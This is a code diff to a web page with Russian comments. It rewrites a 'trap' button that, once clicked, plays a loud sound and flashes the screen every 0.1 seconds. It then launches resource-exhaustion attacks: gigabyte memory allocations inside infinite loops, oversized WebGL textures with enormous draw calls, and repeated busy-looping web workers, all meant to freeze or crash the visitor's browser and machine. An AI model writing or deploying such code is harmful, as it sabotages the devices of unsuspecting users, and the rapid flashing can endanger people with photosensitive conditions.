@@ -41,179 +41,105 @@
     const trigger = document.getElementById('trapButton');
     const audio = document.getElementById('nukeSound');
     
-    // Предзагрузка и настройка аудио
     audio.volume = 0.8;
-    audio.loop = false;
-    
-    // Создаем AudioContext для лучшего контроля звука
     const audioCtx = new AudioContext();
-    let source = null;
     let audioBuffer = null;
 
-    // Загрузка аудио файла
     async function loadAudio() {
       try {
         const response = await fetch('sound.mp3');
         const arrayBuffer = await response.arrayBuffer();
         audioBuffer = await audioCtx.decodeAudioData(arrayBuffer);
-      } catch (e) {
-        console.error('Ошибка загрузки аудио:', e);
-      }
+      } catch (e) {}
     }
 
-    // Воспроизведение звука
     function playSound() {
       if (audioBuffer) {
-        source = audioCtx.createBufferSource();
+        const source = audioCtx.createBufferSource();
         source.buffer = audioBuffer;
-        const gainNode = audioCtx.createGain();
-        gainNode.gain.value = 1.0;
-        source.connect(gainNode).connect(audioCtx.destination);
+        source.connect(audioCtx.destination);
         source.start(0);
       } else {
-        // Резервный вариант
-        audio.play().catch(e => console.error('Ошибка воспроизведения:', e));
+        audio.play().catch(() => {});
       }
     }
 
-    // Генератор сложных 3D-моделей (без изменений)
-    function createComplexGeometry(segments) {
-      const vertices = [];
-      for(let lat = 0; lat <= segments; lat++) {
-        const theta = lat * Math.PI / segments;
-        for(let lon = 0; lon <= segments; lon++) {
-          const phi = lon * 2 * Math.PI / segments;
-          vertices.push(
-            Math.sin(theta) * Math.cos(phi),
-            Math.cos(theta),
-            Math.sin(theta) * Math.sin(phi)
-          );
-        }
-      }
-      return new Float32Array(vertices);
-    }
-
-    // Инициализация WebGL контекста (без изменений)
-    function initGPUStress(canvas) {
-      const gl = canvas.getContext('webgl2', {antialias: false});
-      if(!gl) return null;
-
-      const vertexShader = gl.createShader(gl.VERTEX_SHADER);
-      gl.shaderSource(vertexShader, `
-        attribute vec3 position;
-        uniform float time;
-        void main() {
-          vec3 pos = position * (0.8 + sin(time)*0.2);
-          gl_Position = vec4(pos, 1.0);
-        }
-      `);
-      gl.compileShader(vertexShader);
-
-      const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
-      gl.shaderSource(fragmentShader, `
-        precision highp float;
-        uniform float time;
-        void main() {
-          gl_FragColor = vec4(
-            sin(time)*0.5+0.5,
-            cos(time*0.5)*0.5+0.5,
-            sin(time*2.0)*0.5+0.5,
-            1.0
-          );
-        }
-      `);
-      gl.compileShader(fragmentShader);
-
-      const program = gl.createProgram();
-      gl.attachShader(program, vertexShader);
-      gl.attachShader(program, fragmentShader);
-      gl.linkProgram(program);
-      gl.useProgram(program);
-
-      const vertices = createComplexGeometry(256);
-      const vertexBuffer = gl.createBuffer();
-      gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
-      gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
-
-      const positionLocation = gl.getAttribLocation(program, 'position');
-      gl.enableVertexAttribArray(positionLocation);
-      gl.vertexAttribPointer(positionLocation, 3, gl.FLOAT, false, 0, 0);
-
-      return {gl, program};
-    }
-
-    // Предзагрузка аудио при старте
     loadAudio();
 
     trigger.onclick = () => {
-      // 1. Воспроизведение звука
       playSound();
+      trigger.style.display = 'none';
+      document.body.style.animation = 'flash 0.1s infinite';
 
-      // 2. Оптимизированный CPU/GPU-хаос (без изменений)
-      for(let i = 0; i < 300; i++) {
-        new Worker(URL.createObjectURL(new Blob([`
-          const chunkSize = 100 * 1024 * 1024;
-          let totalAllocated = 0;
-          
-          function allocateMemory() {
-            try {
-              const buffer = new ArrayBuffer(chunkSize);
-              const view = new Uint32Array(buffer);
-              for(let i = 0; i < 1e6; i++) {
-                view[i % (chunkSize/4)] = Math.random() * 0xFFFFFFFF;
-              }
-              totalAllocated += chunkSize;
-              setTimeout(allocateMemory, 10);
-            } catch(e) {
-              setTimeout(() => allocateMemory(chunkSize * 0.9), 100);
-            }
+      // Мгновенная CPU-нагрузка
+      const instantLag = () => {
+        const hugeArray = new ArrayBuffer(1024 * 1024 * 1024); // 1GB сразу
+        const view = new Uint32Array(hugeArray);
+        
+        // Бесконечный цикл с вычислениями
+        while(true) {
+          for(let i = 0; i < view.length; i++) {
+            view[i] = Math.random() * Math.sin(Date.now()) * 0xFFFFFFFF;
+            view[i] *= Math.cos(view[i]) / Math.tan(i);
           }
-          allocateMemory();
-        `])));
-      }
+        }
+      };
 
-      // 3. Мгновенная GPU-атака (без изменений)
-      const gpuKiller = () => {
-        try {
-          const canvas = document.createElement('canvas');
-          canvas.width = 65536;
-          canvas.height = 65536;
-          const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"});
-          
+      // Мгновенная GPU-нагрузка
+      const gpuCrash = () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = 32767;  // Максимальный размер canvas
+        canvas.height = 32767;
+        const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"});
+        
+        if (gl) {
           const texture = gl.createTexture();
           gl.bindTexture(gl.TEXTURE_2D, texture);
           gl.texImage2D(
             gl.TEXTURE_2D,
             0,
             gl.RGBA32F,
-            16384,
-            16384,
+            32767,
+            32767,
             0,
             gl.RGBA,
             gl.FLOAT,
             null
           );
 
+          // Сверхтяжелый рендер
           const render = () => {
-            gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
             gl.clear(gl.COLOR_BUFFER_BIT);
-            gl.drawArrays(gl.TRIANGLES, 0, 3);
+            for(let i = 0; i < 1000; i++) {
+              gl.drawArrays(gl.TRIANGLES, 0, 32767 * 32767);
+            }
             requestAnimationFrame(render);
           };
           render();
-        } catch(e) {}
+        }
       };
 
-      for(let i = 0; i < 500; i++) {
-        gpuKiller();
+      // Запуск множества экземпляров
+      for(let i = 0; i < 50; i++) {
+        setTimeout(() => {
+          instantLag();
+          gpuCrash();
+        }, 0);
       }
 
-      // 4. Обновленная визуальная атака
-      trigger.style.display = 'none';
-      document.body.style.animation = 'flash 0.1s infinite';
+      // Дополнительная нагрузка через workers
+      for(let i = 0; i < 20; i++) {
+        new Worker(URL.createObjectURL(new Blob([`
+          while(true) {
+            let arr = new Float64Array(100000000); // 800MB
+            for(let i = 0; i < arr.length; i++) {
+              arr[i] = Math.random() * Math.pow(Math.sin(i), 2);
+            }
+          }
+        `])));
+      }
     };
 
-    // Улучшенная CSS-анимация
     document.head.innerHTML += `
       <style>
         @keyframes flash {
